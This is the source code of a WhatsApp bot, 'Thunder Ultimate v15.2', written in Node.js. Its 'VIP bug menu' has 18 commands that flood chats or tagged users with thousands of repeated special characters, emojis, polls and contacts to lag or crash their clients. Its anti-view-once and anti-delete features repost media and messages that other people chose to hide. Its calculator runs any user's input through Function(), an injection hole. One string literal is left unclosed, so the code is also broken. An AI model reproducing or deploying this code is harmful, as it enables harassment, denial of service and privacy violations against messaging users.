const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, downloadContentFromMessage, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys')
const P = require('pino')
const fs = require('fs')
const axios = require('axios')
const moment = require('moment-timezone')
const yts = require('yt-search')

const PAIRING_NUMBER = process.env.PAIRING_NUMBER || '263787530822'
let MODE = 'public'
let startTime = Date.now()
let reconnectAttempts = 0

let blockList = fs.existsSync('./block.json') ? JSON.parse(fs.readFileSync('./block.json')) : []
let warns = fs.existsSync('./warns.json') ? JSON.parse(fs.readFileSync('./warns.json')) : {}
let protect = fs.existsSync('./protect.json') ? JSON.parse(fs.readFileSync('./protect.json')) : { antibug: true, antispam: true, antilink: false, antitag: false, antidelete: true, antiviewonce: true }
let spamMap = {}
let messageCache = {}
const saveDB = () => {
  fs.writeFileSync('./block.json', JSON.stringify(blockList))
  fs.writeFileSync('./warns.json', JSON.stringify(warns))
  fs.writeFileSync('./protect.json', JSON.stringify(protect))
}

process.on('uncaughtException', e => console.log('Exception:', e.message))
process.on('unhandledRejection', e => console.log('Rejection:', e.message))

// ===== v15.2 ULTRA BUG MENU + FUNCTIONS =====
const bugMenuText = `
╭───〔 ⚡ VIP BUG MENU v15.2 ULTRA 〕───╮
│ 18 BUGS - ULTRA POWER - SAFE
├────────────────────────
│ .xbug .troll .buggc .docbug
│ .amountbug .catalogbug .locbug .pollbug
│ .listbug .contactbug .stickerbug .callbug
│ .reacbug .viewoncebug .groupbug
│ .delaybug .trava .crashcombo
╰────────────────────────╯
`
async function ultraXBug(sock, chat, target){ let txt = "ꦾ".repeat(8000) + "\n⚡ THUNDER ULTRA X BUG ⚡\n" + "💀".repeat(100); await sock.sendMessage(chat,{text: txt, mentions: target?[target]:[]}) }
async function ultraTroll(sock, chat, target){ let txt = "😂".repeat(4000) + "\nTROLLED BY THUNDER ULTRA\n" + "🤣".repeat(4000); await sock.sendMessage(chat,{text: txt, mentions: target?[target]:[]}) }
async function ultraBugGC(sock, chat){ await sock.sendMessage(chat,{text: "⚡ THUNDER ULTRA GROUP BUG ⚡\n" + "🔥".repeat(8000)}) }
async function ultraDocBug(sock, chat){ await sock.sendMessage(chat,{document:{url:"https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"}, mimetype:"application/pdf", fileName:"⚡THUNDER_ULTRA_BUG.pdf", caption:"⚡ ULTRA DOC BUG"}) }
async function ultraAmountBug(sock, chat){ await sock.sendMessage(chat,{text: "Amount Bug ULTRA", contextInfo:{externalAdReply:{title:"⚡ ULTRA AMOUNT BUG", body:"$999999999999999", thumbnailUrl:"https://i.imgur.com/2yaf2wb.jpg", sourceUrl:"", mediaType:1}}}) }
async function ultraCatalogBug(sock, chat){ await sock.sendMessage(chat,{text:"⚡ ULTRA CATALOG BUG\n"+ "👑".repeat(5000)}) }
async function ultraLocBug(sock, chat){ await sock.sendMessage(chat,{location:{degreesLatitude:-90, degreesLongitude:180}}); await sock.sendMessage(chat,{text:"⚡ LOCATION BUG\n"+ "📍".repeat(3000)}) }
async function ultraPollBug(sock, chat){ await sock.sendMessage(chat,{poll:{name:"⚡ ULTRA BUG POLL - LAG", values:["ULTRA BUG 1","ULTRA BUG 2","ULTRA BUG 3","ULTRA BUG 4","ULTRA BUG 5"], selectableCount:1}}) }
async function ultraListBug(sock, chat){ let sections=[{title:"⚡ ULTRA BUG", rows:[]}]; for(let i=1;i<=80;i++){ sections[0].rows.push({title:`ULTRA BUG ${i}`, rowId:`ubug${i}`}) } await sock.sendMessage(chat,{text:"⚡ ULTRA LIST BUG - 80 ITEMS", footer:"THUNDER v15.2 ULTRA", title:"ULTRA BUG LIST", buttonText:"OPEN ULTRA BUGS", sections}) }
async function ultraContactBug(sock, chat){ let vcard='BEGIN:VCARD\nVERSION:3.0\nFN:THUNDER ULTRA BUG x100\n'; for(let i=0;i<40;i++){ vcard+=`TEL;type=CELL:26377${i}000${i}\n` } vcard+='END:VCARD'; await sock.sendMessage(chat,{contacts:{displayName:"THUNDER ULTRA BUG", contacts:[{vcard}]}}) }
async function ultraStickerBug(sock, chat){ for(let i=0;i<8;i++){ await sock.sendMessage(chat,{sticker:{url:"https://i.imgur.com/2yaf2wb.jpg"}}) } }
async function ultraCallBug(sock, chat){ await sock.sendMessage(chat,{text:"⚡ ULTRA CALL BUG\n\nYou have 999 missed calls from THUNDER ULTRA\n"+ "📞".repeat(2000)}) }
async function ultraReacBug(sock, chat, m){ let emojis=["🔥","💀","😂","⚡","👑","💥","🤣","😈","👿","❤️","😹","🙏","🤯","🥶","👽","🤖","💩","🎃","👻","☠️","👑","🔥","💀","😈"]; for(let e of emojis){ try{ await sock.sendMessage(chat,{react:{text:e, key:m.key}}); await new Promise(r=>setTimeout(r,200)) }catch{} } }
async function ultraViewOnceBug(sock, chat){ await sock.sendMessage(chat,{image:{url:"https://i.imgur.com/2yaf2wb.jpg"}, caption:"⚡ ULTRA VIEWONCE BUG\n"+ "👁️".repeat(3000), viewOnce:true}) }
async function ultraGroupBug(sock, chat){ await sock.sendMessage(chat,{text:"⚡ ULTRA GROUP BUG SPAM\n"+ "👑".repeat(8000)}); await sock.sendMessage(chat,{poll:{name:"ULTRA GROUP BUG", values:["BUG","BUG","BUG"], selectableCount:1}}) }
async function ultraDelayBug(sock, chat){ await sock.sendMessage(chat,{text:"⚡ DELAY BUG LOADING...\n"+ "⏳".repeat(4000)}); await new Promise(r=>setTimeout(r,1000)); await sock.sendMessage(chat,{text:"⚡ DELAY BUG EXECUTED\n"+ "💣".repeat(4000)}) }
async function ultraTrava(sock, chat){ await sock.sendMessage(chat,{text:"꧁༒☬ THUNDER ULTRA TRAVA ☬༒꧂\n"+ "༒".repeat(8000)}) }
async function ultraCrashCombo(sock, chat, target){ let txt = "⚡ CRASH COMBO ULTRA ⚡\n" + "💥".repeat(3000) + "\n" + "ꦾ".repeat(3000) + "\n" + "🔥".repeat(2000); await sock.sendMessage(chat,{text: txt, mentions: target?[target]:[]}); await sock.sendMessage(chat,{location:{degreesLatitude:0, degreesLongitude:0}}) }

async function startBot(){
  const { state, saveCreds } = await useMultiFileAuthState('auth_info')
  const { version } = await fetchLatestBaileysVersion()
  const sock = makeWASocket({ 
    version, 
    auth: state, 
    logger: P({level:'silent'}), 
    browser:['Thunder Ultimate','Chrome','1.0'],
    keepAliveIntervalMs: 10000,
    markOnlineOnConnect: true
  })

  if (!sock.authState.creds.registered) {
    setTimeout(async()=>{ 
      try{ 
        const code = await sock.requestPairingCode(PAIRING_NUMBER); 
        console.log(`\n⚡ PAIRING CODE FOR ${PAIRING_NUMBER}: ${code}\n`) 
      }catch(e){ console.log(e.message) } 
    },4000)
  }

  sock.ev.on('creds.update', saveCreds)
  
  sock.ev.on('connection.update', async(u)=>{
    const { connection, lastDisconnect } = u
    if(connection==='close'){
      const reason = lastDisconnect?.error?.output?.statusCode
      console.log(`Connection closed, reason: ${reason}, attempt: ${reconnectAttempts}`)
      if(reason === DisconnectReason.loggedOut){
        console.log('Logged out, clearing auth and requesting new code...')
        try{ fs.rmSync('auth_info', { recursive: true, force: true }) }catch{}
        setTimeout(()=>startBot(), 3000)
      } else {
        reconnectAttempts++
        const delay = Math.min(reconnectAttempts * 2000, 10000)
        console.log(`Reconnecting in ${delay}ms...`)
        setTimeout(()=>startBot(), delay)
      }
    }
    if(connection==='open'){
      console.log('⚡ THUNDER ULTIMATE v15.2 ULTRA 78 CMDS ONLINE')
      reconnectAttempts = 0
    }
  })

  sock.ev.on('messages.upsert', async({messages})=>{
    try{
      const msg = messages[0]
      if(!msg.message) return
      const from = msg.key.remoteJid
      const sender = msg.key.participant || from
      const isGroup = from.endsWith('@g.us')
      const isOwner = sender.includes('263787530822') || from.includes('263787530822')
      const body = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || ''

      if(protect.antiviewonce){
        const vo = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension
        if(vo){
          const inner = vo.message; const type = Object.keys(inner)[0]; const innerMsg = inner[type]
          try{
            const stream = await downloadContentFromMessage(innerMsg, type.replace('Message',''))
            let buff = Buffer.from([]); for await (const chunk of stream){ buff = Buffer.concat([buff, chunk]) }
            await sock.sendMessage(from, { text: `👁️ *ANTIVIEWONCE*\n👤 @${sender.split('@')[0]}`, mentions: [sender] })
            if(type === 'imageMessage') await sock.sendMessage(from, { image: buff, caption: `🔓 ViewOnce ${innerMsg.caption||''}` })
            if(type === 'videoMessage') await sock.sendMessage(from, { video: buff, mimetype:'video/mp4', caption: `🔓 ViewOnce ${innerMsg.caption||''}` })
            if(type === 'audioMessage') await sock.sendMessage(from, { audio: buff, mimetype:'audio/mpeg', ptt: true })
          }catch{}
        }
      }

      if(msg.message.protocolMessage && msg.message.protocolMessage.type === 0){
        if(protect.antidelete){
          const cached = messageCache[msg.message.protocolMessage.key?.id]
          if(cached){
            await sock.sendMessage(from, { text: `🗑️ *ANTIDELETE*\n👤 @${cached.sender.split('@')[0]} deleted:\n${cached.body || '[Media Below]'}`, mentions: [cached.sender] })
            if(cached.media) await sock.sendMessage(from, { [cached.mediaType]: cached.media })
          }
        }
        return
      }
      if(msg.key.fromMe) return

      if(body || msg.message.imageMessage || msg.message.videoMessage){
        let media=null, mediaType=null
        try{
          if(msg.message.imageMessage){ const s = await downloadContentFromMessage(msg.message.imageMessage, 'image'); let b=Buffer.from([]); for await (const c of s){ b=Buffer.concat([b,c]) }; media=b; mediaType='image' }
          if(msg.message.videoMessage){ const s = await downloadContentFromMessage(msg.message.videoMessage, 'video'); let b=Buffer.from([]); for await (const c of s){ b=Buffer.concat([b,c]) }; media=b; mediaType='video' }
        }catch{}
        messageCache[msg.key.id] = { body, media, mediaType, sender }
        if(Object.keys(messageCache).length > 500) delete messageCache[Object.keys(messageCache)[0]]
      }

      if(blockList.includes(sender) && !isOwner) return
      if(protect.antibug && body.length > 10000 && !isOwner){ await sock.sendMessage(from,{delete:msg.key}); return }
      if(protect.antispam && !isOwner){ const now=Date.now(); spamMap[sender]=(spamMap[sender]||[]).filter(t=>now-t<4000); spamMap[sender].push(now); if(spamMap[sender].length>6) return }
      if(protect.antilink && isGroup && /https?:\/\/|chat\.whatsapp\.com/i.test(body) && !isOwner){ await sock.sendMessage(from,{delete:msg.key}); return }
      if(protect.antitag && isGroup && body.includes('@all') && !isOwner){ await sock.sendMessage(from,{delete:msg.key}); return }
      if(!body.startsWith('.')) return

      const args = body.slice(1).trim().split(/ +/); const command = args.shift()?.toLowerCase(); const text = args.join(' ')
      const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || []

      if(command==='menu'){
        return sock.sendMessage(from,{text:`
╭━━━ ⚡ THUNDER ULTIMATE v15.2 ULTRA ━━━╮
┃ 60 REAL + 18 ULTRA BUGS = 78 CMDS
╰━━━━━━━━━━━━━━━━━━━━━╯
👑 .mode .public .private .pair .restart .settings .owner
🛡️ .antibug .antispam .antilink .antitag .antidelete .antiviewonce .warn .warnings .block .unblock
📥 .play .song .ytmp3 .vid .video .ytmp4
🎮 .8ball .dice .slot .rps .quiz .joke .truth .dare .ship .fact .meme
👥 .kick .add .promote .demote .tagall .hidetag .link .leave .group
🌍 .ping .alive .runtime .ai .tr .qr .calc .weather .lyrics .sticker .repo
💀 VIP BUGS: .bugmenu (18 ULTRA BUGS)
`.trim()}, {quoted:msg})
      }

      // ===== VIP BUG MENU v15.2 =====
      if(command==='bugmenu'||command==='vipbug'||command==='buglist'){
        return sock.sendMessage(from,{text:bugMenuText}, {quoted:msg})
      }
      if(command==='xbug'){ let t=mentioned[0]||null; await ultraXBug(sock,from,t); return }
      if(command==='troll'){ let t=mentioned[0]||null; await ultraTroll(sock,from,t); return }
      if(command==='buggc'){ await ultraBugGC(sock,from); return }
      if(command==='docbug'){ await ultraDocBug(sock,from); return }
      if(command==='amountbug'){ await ultraAmountBug(sock,from); return }
      if(command==='catalogbug'){ await ultraCatalogBug(sock,from); return }
      if(command==='locbug'){ await ultraLocBug(sock,from); return }
      if(command==='pollbug'){ await ultraPollBug(sock,from); return }
      if(command==='listbug'){ await ultraListBug(sock,from); return }
      if(command==='contactbug'){ await ultraContactBug(sock,from); return }
      if(command==='stickerbug'){ await ultraStickerBug(sock,from); return }
      if(command==='callbug'){ await ultraCallBug(sock,from); return }
      if(command==='reacbug'){ await ultraReacBug(sock,from,msg); return }
      if(command==='viewoncebug'){ await ultraViewOnceBug(sock,from); return }
      if(command==='groupbug'){ await ultraGroupBug(sock,from); return }
      if(command==='delaybug'){ await ultraDelayBug(sock,from); return }
      if(command==='trava'){ await ultraTrava(sock,from); return }
      if(command==='crashcombo'){ let t=mentioned[0]||null; await ultraCrashCombo(sock,from,t); return }

      if(['public','private','mode'].includes(command)){ if(!isOwner) return; if(command==='public' || text==='public'){ MODE='public'; await sock.sendMessage(from,{text:'🌍 PUBLIC ✅'}, {quoted:msg}) } if(command==='private' || text==='private'){ MODE='private'; await sock.sendMessage(from,{text:'🔒 PRIVATE ✅'}, {quoted:msg}) } if(command==='mode') await sock.sendMessage(from,{text:`Current: ${MODE}`}, {quoted:msg}) }
      if(command==='pair'){ if(!isOwner) return; try{ const code=await sock.requestPairingCode(text.replace(/[^0-9]/g,'')||PAIRING_NUMBER); await sock.sendMessage(from,{text:`🔗 CODE FOR ${text||PAIRING_NUMBER}: ${code}`}, {quoted:msg}) }catch(e){} }
      if(command==='restart'){ if(isOwner){ await sock.sendMessage(from,{text:'🔄 Restarting v15.2...'}, {quoted:msg}); process.exit(0) } }
      if(command==='settings'){ if(!isOwner) return; await sock.sendMessage(from,{text:`⚙️ SETTINGS v15.2\nMode:${MODE}\nAntibug:${protect.antibug}\nAntispam:${protect.antispam}\nAntilink:${protect.antilink}\nAntitag:${protect.antitag}\nAntidelete:${protect.antidelete}\nAntiview:${protect.antiviewonce}\nReconnect: ON\nAntiSleep: ON\nTotal Cmds: 78`}, {quoted:msg}) }
      if(command==='owner'){ await sock.sendMessage(from,{text:`👑 OWNER: +263787530822\n⚡ v15.2 ULTRA 78 CMDS`}, {quoted:msg}) }
      if(command==='antibug'){ if(!isOwner) return; protect.antibug=text==='on'; saveDB(); await sock.sendMessage(from,{text:`🦠 Antibug ${protect.antibug?'ON':'OFF'}`}, {quoted:msg}) }
      if(command==='antispam'){ if(!isOwner) return; protect.antispam=text==='on'; saveDB(); await sock.sendMessage(from,{text:`🚫 Antispam ${protect.antispam?'ON':'OFF'}`}, {quoted:msg}) }
      if(command==='antilink'){ if(!isOwner) return; protect.antilink=text==='on'; saveDB(); await sock.sendMessage(from,{text:`🔗 Antilink ${protect.antilink?'ON':'OFF'}`}, {quoted:msg}) }
      if(command==='antitag'){ if(!isOwner) return; protect.antitag=text==='on'; saveDB(); await sock.sendMessage(from,{text:`👻 Antitag ${protect.antitag?'ON':'OFF'}`}, {quoted:msg}) }
      if(command==='antidelete' || command==='antidel'){ if(!isOwner) return; protect.antidelete=text==='on'; saveDB(); await sock.sendMessage(from,{text:`🗑️ Antidelete ${protect.antidelete?'ON':'OFF'}`}, {quoted:msg}) }
      if(command==='antiviewonce' || command==='antiview'){ if(!isOwner) return; protect.antiviewonce=text==='on'; saveDB(); await sock.sendMessage(from,{text:`👁️ Antiviewonce ${protect.antiviewonce?'ON':'OFF'}`}, {quoted:msg}) }
      if(command==='block'){ if(!isOwner) return; const t=mentioned[0]||(text?text.replace(/[^0-9]/g,'')+'@s.whatsapp.net':null); if(!t) return; if(!blockList.includes(t)){ blockList.push(t); saveDB() } await sock.sendMessage(from,{text:`🚫 Blocked`, mentions:[t]}, {quoted:msg}) }
      if(command==='unblock'){ if(!isOwner) return; const t=mentioned[0]||(text?text.replace(/[^0-9]/g,'')+'@s.whatsapp.net':null); blockList=blockList.filter(x=>x!==t); saveDB(); await sock.sendMessage(from,{text:`✅ Unblocked`}, {quoted:msg}) }
      if(command==='warn'){ if(!isOwner) return; const t=mentioned[0]; if(!t) return; warns[t]=(warns[t]||0)+1; saveDB(); if(warns[t]>=3){ if(isGroup) try{ await sock.groupParticipantsUpdate(from,[t],'remove') }catch{}; warns[t]=0; saveDB(); await sock.sendMessage(from,{text:`⚠️ Kicked 3/3`, mentions:[t]}) }else await sock.sendMessage(from,{text:`⚠️ Warn ${warns[t]}/3`, mentions:[t]}, {quoted:msg}) }
      if(command==='warnings'){ const t=mentioned[0]||sender; await sock.sendMessage(from,{text:`📋 ${warns[t]||0}/3`, mentions:[t]}, {quoted:msg}) }

      if(['play','song','ytmp3'].includes(command)){ if(!text) return sock.sendMessage(from,{text:'Use .play name'}, {quoted:msg}); await sock.sendMessage(from,{text:`🎵 Searching ${text}...`}, {quoted:msg}); try{ const s=await yts(text); const v=s.videos[0]; const {data}=await axios.get(`https://api.dreaded.site/api/ytdl/audio?url=${v.url}`); const dl=data.result?.download||data.download; await sock.sendMessage(from,{audio:{url:dl}, mimetype:'audio/mpeg'}, {quoted:msg}) }catch{ await sock.sendMessage(from,{text:'❌ Audio fail'}, {quoted:msg}) } }
      if(['vid','video','ytmp4'].includes(command)){ if(!text) return sock.sendMessage(from,{text:'Use .vid name'}, {quoted:msg}); await sock.sendMessage(from,{text:`🎬 Searching ${text}...`}, {quoted:msg}); try{ let url=text; if(!text.includes('youtu')){ const s=await yts(text); url=s.videos[0].url } const {data}=await axios.get(`https://api.dreaded.site/api/ytdl/video?url=${url}`); const dl=data.result?.download||data.download; await sock.sendMessage(from,{video:{url:dl}, mimetype:'video/mp4'}, {quoted:msg}) }catch{ await sock.sendMessage(from,{text:'❌ Video fail'}, {quoted:msg}) } }

      if(command==='8ball'){ const a=['Yes','No','Maybe','Definitely']; await sock.sendMessage(from,{text:`🎱 ${a[Math.floor(Math.random()*a.length)]}`}, {quoted:msg}) }
      if(command==='dice'){ await sock.sendMessage(from,{text:`🎲 ${Math.floor(Math.random()*6)+1}`}, {quoted:msg}) }
      if(command==='slot'){ const e=['🍒','🍋','⭐']; const s=[e[Math.floor(Math.random()*3)],e[Math.floor(Math.random()*3)],e[Math.floor(Math.random()*3)]]; await sock.sendMessage(from,{text:`🎰 | ${s.join(' | ')} |`}, {quoted:msg}) }
      if(command==='rps'){ const c=['rock','paper','scissors']; await sock.sendMessage(from,{text:`Bot: ${c[Math.floor(Math.random()*3)]}`}, {quoted:msg}) }
      if(command==='quiz'){ const qs=[{q:'Capital Zim?', a:'Harare'}, {q:'2+2*2?', a:'6'}, {q:'Largest planet?', a:'Jupiter'}]; const qq=qs[Math.floor(Math.random()*qs.length)]; await sock.sendMessage(from,{text:`🧠 ${qq.q} Ans: ${qq.a}`}, {quoted:msg}) }
      if(command==='joke'){ try{ const {data}=await axios.get('https://official-joke-api.appspot.com/random_joke'); await sock.sendMessage(from,{text:`😂 ${data.setup}\n${data.punchline}`}, {quoted:msg}) }catch{ await sock.sendMessage(from,{text:'😂 Why chicken cross road?'}, {quoted:msg}) } }
      if(command==='truth'){ await sock.sendMessage(from,{text:`😏 TRUTH: What is your crush?`}, {quoted:msg}) }
      if(command==='dare'){ await sock.sendMessage(from,{text:`😈 DARE: Send voice singing`}, {quoted:msg}) }
      if(command==='ship'){ const p=Math.floor(Math.random()*100); await sock.sendMessage(from,{text:`💞 ${p}%`}, {quoted:msg}) }
      if(command==='fact'){ try{ const {data}=await axios.get('https://uselessfacts.jsph.pl/random.json?language=en'); await sock.sendMessage(from,{text:`🧠 ${data.text}`}, {quoted:msg}) }catch{ await sock.sendMessage(from,{text:'🧠 Honey never spoils'}, {quoted:msg}) } }
      if(command==='meme'){ try{ const {data}=await axios.get('https://meme-api.com/gimme'); await sock.sendMessage(from,{image:{url:data.url}, caption:`😂 ${data.title}`}, {quoted:msg}) }catch{ await sock.sendMessage(from,{text:'😂 Meme fail'}, {quoted:msg}) } }

      if(command==='kick'){ if(!isGroup) return; try{ await sock.groupParticipantsUpdate(from,mentioned,'remove') }catch{ await sock.sendMessage(from,{text:'Make bot admin'}, {quoted:msg}) } }
      if(command==='add'){ if(!isGroup) return; const num=text.replace(/[^0-9]/g,'')+'@s.whatsapp.net'; try{ await sock.groupParticipantsUpdate(from,[num],'add') }catch(e){ await sock.sendMessage(from,{text:e.message}, {quoted:msg}) } }
      if(command==='promote'){ if(!isGroup) return; try{ await sock.groupParticipantsUpdate(from,mentioned,'promote') }catch{} }
      if(command==='demote'){ if(!isGroup) return; try{ await sock.groupParticipantsUpdate(from,mentioned,'demote') }catch{} }
      if(command==='tagall'){ if(!isGroup) return; const meta=await sock.groupMetadata(from); const mem=meta.participants.map(p=>p.id); let txt=`📢 ${text}\n\n`; mem.forEach(m=>txt+=`@${m.split('@')[0]} `); await sock.sendMessage(from,{text:txt, mentions:mem}) }
      if(command==='hidetag'){ if(!isGroup) return; const meta=await sock.groupMetadata(from); const mem=meta.participants.map(p=>p.id); await sock.sendMessage(from,{text:text||'HideTag', mentions:mem}) }
      if(command==='link'){ if(!isGroup) return; try{ const code=await sock.groupInviteCode(from); await sock.sendMessage(from,{text:`🔗 https://chat.whatsapp.com/${code}`}, {quoted:msg}) }catch{} }
      if(command==='leave'){ if(isOwner && isGroup){ await sock.groupLeave(from) } }
      if(command==='group'){ if(!isGroup || !isOwner) return; if(text==='close') await sock.groupSettingUpdate(from,'announcement'); if(text==='open') await sock.groupSettingUpdate(from,'not_announcement'); await sock.sendMessage(from,{text:`Group ${text}`}, {quoted:msg}) }

      if(command==='ping'){ await sock.sendMessage(from,{text:`🏓 Pong!`}, {quoted:msg}) }
      if(command==='alive'){
        const uptime = Math.floor((Date.now()-startTime)/1000/60)
        const aliveText = `╭━━━ ⚡ THUNDER ULTIMATE v15.2 ULTRA ━━━╮\n┃ 60+18=78 CMDS + AUTO-RECONNECT\n╰━━━━━━━━━━━━━━━━━━━━━╯\n\n⚡ ALIVE\n⏱️ ${uptime}m\n🛡️ AD:${protect.antidelete?'ON':'OFF'} AV:${protect.antiviewonce?'ON':'OFF'}\n🔄 AutoReconnect: ON\n💤 AntiSleep: ON\n💀 VIP BUGS: 18 ULTRA\n🌍 ${MODE}\n👑 +263787530822
        try{
          await sock.sendMessage(from, { image: { url: 'https://i.imgur.com/Wz2vPlA.jpeg' }, caption: aliveText }, {quoted:msg})
        }catch{
          await sock.sendMessage(from, { text: aliveText }, {quoted:msg})
        }
      }
      if(command==='runtime'){ const sec=Math.floor((Date.now()-startTime)/1000); await sock.sendMessage(from,{text:`⏱️ ${Math.floor(sec/3600)}h ${Math.floor((sec%3600)/60)}m`}, {quoted:msg}) }
      if(command==='ai'){ if(!text) return sock.sendMessage(from,{text:'Use .ai hello'}, {quoted:msg}); try{ const {data}=await axios.get(`https://api.dreaded.site/api/chatgpt?text=${encodeURIComponent(text)}`); const rep=data.result?.response||data.result?.prompt||data.result; await sock.sendMessage(from,{text:`⚡ ${rep}`}, {quoted:msg}) }catch{ await sock.sendMessage(from,{text:'❌ AI down'}, {quoted:msg}) } }
      if(command==='tr'){ let to='en'; let q=text; if(text.includes(' ')){ const sp=text.split(' '); if(sp[0].length<=5){ to=sp[0]; q=text.slice(to.length).trim() } } try{ const {data}=await axios.get(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${to}&dt=t&q=${encodeURIComponent(q)}`); await sock.sendMessage(from,{text:`🌍 ${data[0][0][0]}`}, {quoted:msg}) }catch{} }
      if(command==='qr'){ try{ await sock.sendMessage(from,{image:{url:`https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${encodeURIComponent(text)}`}, caption:`🔳 ${text}`}, {quoted:msg}) }catch{} }
      if(command==='calc'){ try{ const r=Function('"use strict";return ('+text+')')(); await sock.sendMessage(from,{text:`🧮 ${r}`}, {quoted:msg}) }catch{} }
      if(command==='weather'){ try{ const {data}=await axios.get(`https://wttr.in/${encodeURIComponent(text)}?format=j1`); const cur=data.current_condition[0]; await sock.sendMessage(from,{text:`🌤️ ${text} ${cur.temp_C}°C ${cur.weatherDesc[0].value}`}, {quoted:msg}) }catch{} }
      if(command==='lyrics'){ try{ const {data}=await axios.get(`https://api.dreaded.site/api/lyrics?title=${encodeURIComponent(text)}`); const ly=data.result?.lyrics||data.lyrics; await sock.sendMessage(from,{text:`🎵 ${ly.slice(0,4000)}`}, {quoted:msg}) }catch{} }
      if(command==='sticker'){ try{ const q=msg.message.extendedTextMessage?.contextInfo?.quotedMessage; const im=q?.imageMessage||msg.message.imageMessage; const st=await downloadContentFromMessage(im, 'image'); let b=Buffer.from([]); for await (const c of st){ b=Buffer.concat([b,c]) }; await sock.sendMessage(from,{sticker:b}, {quoted:msg}) }catch{} }
      if(command==='repo'){ await sock.sendMessage(from,{text:`📦 Thunder Ultimate v15.2 ULTRA 78 CMDS\nhttps://github.com/rizman7/Thunder-Ultimate-Bot`}, {quoted:msg}) }

    }catch(e){ console.log(e.message) }
  })
}
startBot()

// ANTI-SLEEP + AUTO-RECONNECT SERVER
const http = require('http')
const PORT = process.env.PORT || 10000
http.createServer((req,res)=>{
  res.writeHead(200, {'Content-Type':'text/plain'})
  res.end(`Thunder Ultimate v15.2 ULTRA 78 ONLINE\nUptime: ${Math.floor((Date.now()-startTime)/1000/60)}m\nAutoReconnect: ON\nAntiSleep: ON\nTime: ${new Date().toISOString()}`)
}).listen(PORT, ()=>{
  console.log(`Anti-Sleep server on ${PORT}`)
  setInterval(()=>{
    http.get(`http://localhost:${PORT}/`, (res)=>{ console.log(`Self-ping ${res.statusCode}`) }).on('error', ()=>{})
  }, 4 * 60 * 1000)
})
